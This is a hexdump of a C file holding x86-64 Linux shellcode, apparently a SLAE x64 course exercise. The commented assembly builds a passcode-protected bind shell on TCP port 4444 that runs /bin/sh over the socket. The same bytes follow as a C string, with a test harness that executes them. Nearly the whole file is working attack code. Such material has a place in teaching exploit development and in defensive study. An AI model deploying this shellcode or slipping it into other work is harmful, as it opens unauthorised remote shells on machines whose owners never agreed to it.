00000000  2f 2a 0a 3b 41 75 74 68  6f 72 20 2d 20 41 6e 64  |/*.;Author - And|
00000010  72 69 79 20 42 72 75 6b  68 6f 76 65 74 73 6b 79  |riy Brukhovetsky|
00000020  79 20 2d 20 64 6f 6f 6d  65 64 72 61 76 65 6e 20  |y - doomedraven |
00000030  2d 20 53 4c 41 45 78 36  34 20 2d 20 31 33 32 32  |- SLAEx64 - 1322|
00000040  0a 3b 31 37 35 20 62 79  74 65 73 0a 3b 68 74 74  |.;175 bytes.;htt|
00000050  70 3a 2f 2f 77 77 77 2e  64 6f 6f 6d 65 64 72 61  |p://www.doomedra|
00000060  76 65 6e 2e 63 6f 6d 2f  32 30 31 34 2f 30 35 2f  |ven.com/2014/05/|
00000070  73 6c 61 65 78 36 34 2d  73 68 65 6c 6c 62 69 6e  |slaex64-shellbin|
00000080  64 74 63 70 2d 77 69 74  68 2d 70 61 73 73 63 6f  |dtcp-with-passco|
00000090  64 65 2e 68 74 6d 6c 0a  0a 67 6c 6f 62 61 6c 20  |de.html..global |
000000a0  5f 73 74 61 72 74 0a 73  65 63 74 69 6f 6e 20 2e  |_start.section .|
000000b0  74 65 78 74 0a 5f 73 74  61 72 74 3a 0a 20 20 20  |text._start:.   |
000000c0  20 70 75 73 68 20 62 79  74 65 20 30 78 32 39 20  | push byte 0x29 |
000000d0  3b 20 34 31 20 2d 20 73  6f 63 6b 65 74 20 73 79  |; 41 - socket sy|
000000e0  73 63 61 6c 6c 20 0a 20  20 20 20 70 6f 70 20 72  |scall .    pop r|
000000f0  61 78 0a 20 20 20 20 70  75 73 68 20 62 79 74 65  |ax.    push byte|
00000100  20 30 78 30 32 20 3b 20  41 46 5f 49 4e 45 54 0a  | 0x02 ; AF_INET.|
00000110  20 20 20 20 70 6f 70 20  72 64 69 20 0a 20 20 20  |    pop rdi .   |
00000120  20 70 75 73 68 20 62 79  74 65 20 30 78 30 31 20  | push byte 0x01 |
00000130  3b 20 53 4f 43 4b 5f 53  54 52 45 41 4d 0a 20 20  |; SOCK_STREAM.  |
00000140  20 20 70 6f 70 20 72 73  69 0a 20 20 20 20 63 64  |  pop rsi.    cd|
00000150  71 0a 20 20 20 20 73 79  73 63 61 6c 6c 0a 20 20  |q.    syscall.  |
00000160  20 20 0a 20 20 20 20 3b  63 6f 70 79 20 73 6f 63  |  .    ;copy soc|
00000170  6b 65 74 20 64 65 73 63  72 69 70 74 6f 72 20 74  |ket descriptor t|
00000180  6f 20 72 64 69 20 66 6f  72 20 66 75 74 75 72 65  |o rdi for future|
00000190  20 75 73 65 0a 20 20 20  20 3b 62 69 6e 64 0a 20  | use.    ;bind. |
000001a0  20 20 20 78 63 68 67 20  72 64 69 2c 20 72 61 78  |   xchg rdi, rax|
000001b0  0a 20 20 20 20 78 6f 72  20 72 61 78 2c 20 72 61  |.    xor rax, ra|
000001c0  78 0a 20 20 20 20 6d 6f  76 20 64 77 6f 72 64 20  |x.    mov dword |
000001d0  5b 72 73 70 2d 34 5d 2c  20 65 61 78 20 20 20 20  |[rsp-4], eax    |
000001e0  3b 49 4e 41 44 44 52 5f  41 4e 59 0a 20 20 20 20  |;INADDR_ANY.    |
000001f0  6d 6f 76 20 77 6f 72 64  20 20 5b 72 73 70 2d 36  |mov word  [rsp-6|
00000200  5d 2c 20 30 78 35 63 31  31 20 3b 50 4f 52 54 20  |], 0x5c11 ;PORT |
00000210  34 34 34 34 0a 20 20 20  20 6d 6f 76 20 62 79 74  |4444.    mov byt|
00000220  65 20 20 5b 72 73 70 2d  38 5d 2c 20 30 78 32 20  |e  [rsp-8], 0x2 |
00000230  20 20 20 3b 41 46 5f 49  4e 45 54 0a 20 20 20 20  |   ;AF_INET.    |
00000240  73 75 62 20 72 73 70 2c  20 30 78 38 0a 20 20 20  |sub rsp, 0x8.   |
00000250  20 0a 20 20 20 20 70 75  73 68 20 62 79 74 65 20  | .    push byte |
00000260  30 78 33 31 20 3b 34 39  20 62 69 6e 64 0a 20 20  |0x31 ;49 bind.  |
00000270  20 20 70 6f 70 20 72 61  78 20 0a 20 20 20 20 6d  |  pop rax .    m|
00000280  6f 76 20 72 73 69 2c 20  72 73 70 0a 20 20 20 20  |ov rsi, rsp.    |
00000290  63 64 71 0a 20 20 20 20  61 64 64 20 64 6c 2c 20  |cdq.    add dl, |
000002a0  31 36 20 3b 6c 65 6e 0a  20 20 20 20 73 79 73 63  |16 ;len.    sysc|
000002b0  61 6c 6c 0a 20 20 20 20  0a 20 20 20 20 3b 6c 69  |all.    .    ;li|
000002c0  73 74 65 6e 0a 20 20 20  20 70 75 73 68 20 62 79  |sten.    push by|
000002d0  74 65 20 30 78 33 32 20  3b 6c 69 73 74 65 6e 0a  |te 0x32 ;listen.|
000002e0  20 20 20 20 70 6f 70 20  72 61 78 0a 20 20 20 20  |    pop rax.    |
000002f0  3b 70 75 73 68 20 62 79  74 65 20 30 78 30 32 20  |;push byte 0x02 |
00000300  3b 6d 61 78 20 63 6c 69  65 6e 74 73 0a 20 20 20  |;max clients.   |
00000310  20 3b 70 6f 70 20 72 73  69 0a 20 20 20 20 73 79  | ;pop rsi.    sy|
00000320  73 63 61 6c 6c 0a 20 20  20 20 20 0a 20 20 20 20  |scall.     .    |
00000330  70 75 73 68 20 62 79 74  65 20 30 78 32 62 20 3b  |push byte 0x2b ;|
00000340  20 61 63 63 65 70 74 0a  20 20 20 20 70 6f 70 20  | accept.    pop |
00000350  72 61 78 0a 20 20 20 20  73 75 62 20 72 73 70 2c  |rax.    sub rsp,|
00000360  20 30 78 31 30 20 20 3b  20 61 64 6a 75 73 74 0a  | 0x10  ; adjust.|
00000370  20 20 20 20 78 6f 72 20  72 73 69 2c 20 72 73 69  |    xor rsi, rsi|
00000380  20 20 20 20 0a 20 20 20  20 6d 6f 76 20 72 73 69  |    .    mov rsi|
00000390  2c 20 72 73 70 20 3b 20  70 6f 69 6e 74 65 72 0a  |, rsp ; pointer.|
000003a0  20 20 20 20 6d 6f 76 20  62 79 74 65 20 5b 72 73  |    mov byte [rs|
000003b0  70 2d 31 5d 2c 20 30 78  31 30 20 3b 6c 65 6e 0a  |p-1], 0x10 ;len.|
000003c0  20 20 20 20 73 75 62 20  72 73 70 2c 20 30 78 30  |    sub rsp, 0x0|
000003d0  31 20 20 20 3b 20 61 64  6a 75 73 74 0a 20 20 20  |1   ; adjust.   |
000003e0  20 63 64 71 0a 20 20 20  20 6d 6f 76 20 72 64 78  | cdq.    mov rdx|
000003f0  2c 20 72 73 70 20 3b 20  70 6f 69 6e 74 65 72 0a  |, rsp ; pointer.|
00000400  20 20 20 20 73 79 73 63  61 6c 6c 0a 20 20 20 20  |    syscall.    |
00000410  20 20 20 20 0a 20 20 20  20 3b 72 65 61 64 20 62  |    .    ;read b|
00000420  75 66 66 65 72 0a 20 20  20 20 6d 6f 76 20 72 64  |uffer.    mov rd|
00000430  69 2c 20 72 61 78 20 3b  20 73 6f 63 6b 65 74 0a  |i, rax ; socket.|
00000440  20 20 20 20 78 6f 72 20  72 61 78 2c 20 72 61 78  |    xor rax, rax|
00000450  0a 20 20 20 20 6d 6f 76  20 62 79 74 65 20 5b 72  |.    mov byte [r|
00000460  73 70 2d 31 5d 2c 20 61  6c 20 3b 30 20 72 65 61  |sp-1], al ;0 rea|
00000470  64 0a 20 20 20 20 73 75  62 20 72 73 70 2c 20 31  |d.    sub rsp, 1|
00000480  0a 20 20 20 20 63 64 71  20 20 20 20 20 20 0a 20  |.    cdq      . |
00000490  20 20 20 70 75 73 68 20  72 64 78 20 3b 20 30 20  |   push rdx ; 0 |
000004a0  73 74 64 69 6e 0a 20 20  20 20 6c 65 61 20 72 73  |stdin.    lea rs|
000004b0  69 2c 20 5b 72 73 70 2d  30 78 31 30 5d 20 3b 20  |i, [rsp-0x10] ; |
000004c0  31 36 20 62 79 74 65 73  20 66 72 6f 6d 20 62 75  |16 bytes from bu|
000004d0  66 66 65 72 0a 20 20 20  20 61 64 64 20 64 6c 2c  |ffer.    add dl,|
000004e0  20 30 78 31 30 20 20 20  20 20 20 20 20 3b 20 6c  | 0x10        ; l|
000004f0  65 6e 0a 20 20 20 20 73  79 73 63 61 6c 6c 0a 20  |en.    syscall. |
00000500  20 20 20 0a 20 20 20 20  3b 74 65 73 74 20 70 61  |   .    ;test pa|
00000510  73 73 63 6f 64 65 0a 20  20 20 20 6d 6f 76 20 72  |sscode.    mov r|
00000520  61 78 2c 20 30 78 36 31  37 32 36 34 36 35 36 64  |ax, 0x617264656d|
00000530  36 66 36 66 36 34 20 3b  20 70 61 73 73 63 6f 64  |6f6f64 ; passcod|
00000540  65 20 27 64 6f 6f 6d 65  64 72 61 27 5b 3a 3a 2d  |e 'doomedra'[::-|
00000550  31 5d 2e 65 6e 63 6f 64  65 28 27 68 65 78 27 29  |1].encode('hex')|
00000560  0a 20 20 20 20 70 75 73  68 20 72 64 69 20 20 20  |.    push rdi   |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000580  20 3b 20 73 61 76 65 20  74 68 65 20 73 6f 63 6b  | ; save the sock|
00000590  65 74 0a 20 20 20 20 6c  65 61 20 72 64 69 2c 20  |et.    lea rdi, |
000005a0  5b 72 73 69 5d 20 20 20  20 20 20 20 20 20 20 20  |[rsi]           |
000005b0  20 20 20 3b 20 6c 6f 61  64 20 73 74 72 69 6e 67  |   ; load string|
000005c0  20 66 72 6f 6d 20 61 64  64 72 65 73 73 0a 20 20  | from address.  |
000005d0  20 20 73 63 61 73 71 20  20 20 20 20 20 20 20 20  |  scasq         |
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000005f0  63 6f 6d 70 61 72 65 0a  20 20 20 20 6a 7a 20 61  |compare.    jz a|
00000600  63 63 65 70 74 65 64 5f  70 61 73 73 77 64 20 20  |ccepted_passwd  |
00000610  20 20 20 20 20 20 20 20  3b 20 6a 75 6d 70 20 69  |        ; jump i|
00000620  66 20 65 71 75 61 6c 0a  20 20 20 20 0a 20 20 20  |f equal.    .   |
00000630  20 3b 65 78 69 74 20 69  66 20 64 69 66 66 65 72  | ;exit if differ|
00000640  65 6e 74 20 3a 50 0a 20  20 20 20 78 6f 72 20 72  |ent :P.    xor r|
00000650  61 78 2c 20 72 61 78 20  0a 20 20 20 20 61 64 64  |ax, rax .    add|
00000660  20 61 6c 2c 20 36 30 0a  20 20 20 20 73 79 73 63  | al, 60.    sysc|
00000670  61 6c 6c 0a 0a 61 63 63  65 70 74 65 64 5f 70 61  |all..accepted_pa|
00000680  73 73 77 64 3a 0a 0a 20  20 20 20 70 6f 70 20 72  |sswd:..    pop r|
00000690  64 69 3b 20 73 6f 63 6b  65 74 0a 20 20 20 20 70  |di; socket.    p|
000006a0  75 73 68 20 62 79 74 65  20 30 78 30 33 0a 20 20  |ush byte 0x03.  |
000006b0  20 20 70 6f 70 20 72 73  69 0a 0a 64 75 70 32 5f  |  pop rsi..dup2_|
000006c0  6c 6f 6f 70 3a 0a 20 20  20 20 64 65 63 20 72 73  |loop:.    dec rs|
000006d0  69 0a 20 20 20 20 70 75  73 68 20 62 79 74 65 20  |i.    push byte |
000006e0  30 78 32 31 0a 20 20 20  20 70 6f 70 20 72 61 78  |0x21.    pop rax|
000006f0  0a 20 20 20 20 73 79 73  63 61 6c 6c 0a 20 20 20  |.    syscall.   |
00000700  20 6a 6e 7a 20 64 75 70  32 5f 6c 6f 6f 70 20 3b  | jnz dup2_loop ;|
00000710  20 6a 75 6d 70 20 69 66  20 6e 6f 74 20 30 0a 0a  | jump if not 0..|
00000720  20 20 20 20 70 75 73 68  20 72 73 69 3b 20 30 0a  |    push rsi; 0.|
00000730  20 20 20 20 0a 20 20 20  20 3b 65 78 65 63 76 65  |    .    ;execve|
00000740  0a 20 20 20 20 3b 70 75  73 68 20 2f 62 69 6e 2f  |.    ;push /bin/|
00000750  2f 73 68 20 69 6e 20 72  65 76 65 72 73 65 0a 20  |/sh in reverse. |
00000760  20 20 20 6d 6f 76 20 72  62 78 2c 20 30 78 36 38  |   mov rbx, 0x68|
00000770  37 33 32 66 32 66 36 65  36 39 36 32 32 66 0a 20  |732f2f6e69622f. |
00000780  20 20 20 70 75 73 68 20  72 62 78 0a 20 20 20 20  |   push rbx.    |
00000790  0a 20 20 20 20 6d 6f 76  20 72 64 69 2c 20 72 73  |.    mov rdi, rs|
000007a0  70 0a 20 20 20 20 70 75  73 68 20 72 73 69 0a 20  |p.    push rsi. |
000007b0  20 20 20 0a 20 20 20 20  6d 6f 76 20 72 64 78 2c  |   .    mov rdx,|
000007c0  20 72 73 70 0a 20 20 20  20 70 75 73 68 20 72 64  | rsp.    push rd|
000007d0  69 20 0a 20 20 20 20 0a  20 20 20 20 6d 6f 76 20  |i .    .    mov |
000007e0  72 73 69 2c 20 72 73 70  0a 20 20 20 20 70 75 73  |rsi, rsp.    pus|
000007f0  68 20 62 79 74 65 20 30  78 33 62 0a 20 20 20 20  |h byte 0x3b.    |
00000800  70 6f 70 20 72 61 78 0a  20 20 20 20 73 79 73 63  |pop rax.    sysc|
00000810  61 6c 6c 0a 20 20 20 20  0a 2a 2f 0a 20 20 20 20  |all.    .*/.    |
00000820  20 20 20 20 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |    .#include <s|
00000830  74 64 69 6f 2e 68 3e 0a  23 69 6e 63 6c 75 64 65  |tdio.h>.#include|
00000840  20 3c 73 74 72 69 6e 67  2e 68 3e 0a 0a 2f 2f 20  | <string.h>..// |
00000850  31 37 35 20 62 79 74 65  73 20 0a 75 6e 73 69 67  |175 bytes .unsig|
00000860  6e 65 64 20 63 68 61 72  20 63 6f 64 65 5b 5d 20  |ned char code[] |
00000870  3d 5c 0a 22 5c 78 36 61  5c 78 32 39 5c 78 35 38  |=\."\x6a\x29\x58|
00000880  5c 78 36 61 5c 78 30 32  5c 78 35 66 5c 78 36 61  |\x6a\x02\x5f\x6a|
00000890  5c 78 30 31 5c 78 35 65  5c 78 39 39 5c 78 30 66  |\x01\x5e\x99\x0f|
000008a0  5c 78 30 35 22 0a 22 5c  78 34 38 5c 78 39 37 5c  |\x05"."\x48\x97\|
000008b0  78 34 38 5c 78 33 31 5c  78 63 30 5c 78 38 39 5c  |x48\x31\xc0\x89\|
000008c0  78 34 34 5c 78 32 34 5c  78 66 63 5c 78 36 36 5c  |x44\x24\xfc\x66\|
000008d0  78 63 37 5c 78 34 34 22  0a 22 5c 78 32 34 5c 78  |xc7\x44"."\x24\x|
000008e0  66 61 5c 78 31 31 5c 78  35 63 5c 78 63 36 5c 78  |fa\x11\x5c\xc6\x|
000008f0  34 34 5c 78 32 34 5c 78  66 38 5c 78 30 32 5c 78  |44\x24\xf8\x02\x|
00000900  34 38 5c 78 38 33 5c 78  65 63 22 0a 22 5c 78 30  |48\x83\xec"."\x0|
00000910  38 5c 78 36 61 5c 78 33  31 5c 78 35 38 5c 78 34  |8\x6a\x31\x58\x4|
00000920  38 5c 78 38 39 5c 78 65  36 5c 78 39 39 5c 78 38  |8\x89\xe6\x99\x8|
00000930  30 5c 78 63 32 5c 78 31  30 5c 78 30 66 22 0a 22  |0\xc2\x10\x0f"."|
00000940  5c 78 30 35 5c 78 36 61  5c 78 33 32 5c 78 35 38  |\x05\x6a\x32\x58|
00000950  5c 78 30 66 5c 78 30 35  5c 78 36 61 5c 78 32 62  |\x0f\x05\x6a\x2b|
00000960  5c 78 35 38 5c 78 34 38  5c 78 38 33 5c 78 65 63  |\x58\x48\x83\xec|
00000970  22 0a 22 5c 78 31 30 5c  78 34 38 5c 78 33 31 5c  |"."\x10\x48\x31\|
00000980  78 66 36 5c 78 34 38 5c  78 38 39 5c 78 65 36 5c  |xf6\x48\x89\xe6\|
00000990  78 63 36 5c 78 34 34 5c  78 32 34 5c 78 66 66 5c  |xc6\x44\x24\xff\|
000009a0  78 31 30 22 0a 22 5c 78  34 38 5c 78 38 33 5c 78  |x10"."\x48\x83\x|
000009b0  65 63 5c 78 30 31 5c 78  39 39 5c 78 34 38 5c 78  |ec\x01\x99\x48\x|
000009c0  38 39 5c 78 65 32 5c 78  30 66 5c 78 30 35 5c 78  |89\xe2\x0f\x05\x|
000009d0  34 38 5c 78 38 39 22 0a  22 5c 78 63 37 5c 78 34  |48\x89"."\xc7\x4|
000009e0  38 5c 78 33 31 5c 78 63  30 5c 78 38 38 5c 78 34  |8\x31\xc0\x88\x4|
000009f0  34 5c 78 32 34 5c 78 66  66 5c 78 34 38 5c 78 38  |4\x24\xff\x48\x8|
00000a00  33 5c 78 65 63 5c 78 30  31 22 0a 22 5c 78 39 39  |3\xec\x01"."\x99|
00000a10  5c 78 35 32 5c 78 34 38  5c 78 38 64 5c 78 37 34  |\x52\x48\x8d\x74|
00000a20  5c 78 32 34 5c 78 66 30  5c 78 38 30 5c 78 63 32  |\x24\xf0\x80\xc2|
00000a30  5c 78 31 30 5c 78 30 66  5c 78 30 35 22 0a 22 5c  |\x10\x0f\x05"."\|
00000a40  78 34 38 5c 78 62 38 5c  78 36 34 5c 78 36 66 5c  |x48\xb8\x64\x6f\|
00000a50  78 36 66 5c 78 36 64 5c  78 36 35 5c 78 36 34 5c  |x6f\x6d\x65\x64\|
00000a60  78 37 32 5c 78 36 31 5c  78 35 37 5c 78 34 38 22  |x72\x61\x57\x48"|
00000a70  0a 22 5c 78 38 64 5c 78  33 65 5c 78 34 38 5c 78  |."\x8d\x3e\x48\x|
00000a80  61 66 5c 78 37 34 5c 78  30 37 5c 78 34 38 5c 78  |af\x74\x07\x48\x|
00000a90  33 31 5c 78 63 30 5c 78  30 34 5c 78 33 63 5c 78  |31\xc0\x04\x3c\x|
00000aa0  30 66 22 0a 22 5c 78 30  35 5c 78 35 66 5c 78 36  |0f"."\x05\x5f\x6|
00000ab0  61 5c 78 30 33 5c 78 35  65 5c 78 34 38 5c 78 66  |a\x03\x5e\x48\xf|
00000ac0  66 5c 78 63 65 5c 78 36  61 5c 78 32 31 5c 78 35  |f\xce\x6a\x21\x5|
00000ad0  38 5c 78 30 66 22 0a 22  5c 78 30 35 5c 78 37 35  |8\x0f"."\x05\x75|
00000ae0  5c 78 66 36 5c 78 35 36  5c 78 34 38 5c 78 62 62  |\xf6\x56\x48\xbb|
00000af0  5c 78 32 66 5c 78 36 32  5c 78 36 39 5c 78 36 65  |\x2f\x62\x69\x6e|
00000b00  5c 78 32 66 5c 78 32 66  22 0a 22 5c 78 37 33 5c  |\x2f\x2f"."\x73\|
00000b10  78 36 38 5c 78 35 33 5c  78 34 38 5c 78 38 39 5c  |x68\x53\x48\x89\|
00000b20  78 65 37 5c 78 35 36 5c  78 34 38 5c 78 38 39 5c  |xe7\x56\x48\x89\|
00000b30  78 65 32 5c 78 35 37 5c  78 34 38 22 0a 22 5c 78  |xe2\x57\x48"."\x|
00000b40  38 39 5c 78 65 36 5c 78  36 61 5c 78 33 62 5c 78  |89\xe6\x6a\x3b\x|
00000b50  35 38 5c 78 30 66 5c 78  30 35 22 3b 0a 0a 6d 61  |58\x0f\x05";..ma|
00000b60  69 6e 28 29 0a 7b 0a 20  20 20 20 70 72 69 6e 74  |in().{.    print|
00000b70  66 28 22 53 68 65 6c 6c  63 6f 64 65 20 4c 65 6e  |f("Shellcode Len|
00000b80  67 74 68 3a 20 25 64 5c  6e 22 2c 20 28 69 6e 74  |gth: %d\n", (int|
00000b90  29 73 74 72 6c 65 6e 28  63 6f 64 65 29 29 3b 0a  |)strlen(code));.|
00000ba0  20 20 20 20 69 6e 74 20  28 2a 72 65 74 29 28 29  |    int (*ret)()|
00000bb0  20 3d 20 28 69 6e 74 28  2a 29 28 29 29 63 6f 64  | = (int(*)())cod|
00000bc0  65 3b 0a 20 20 20 20 72  65 74 28 29 3b 0a 7d     |e;.    ret();.}|
00000bcf
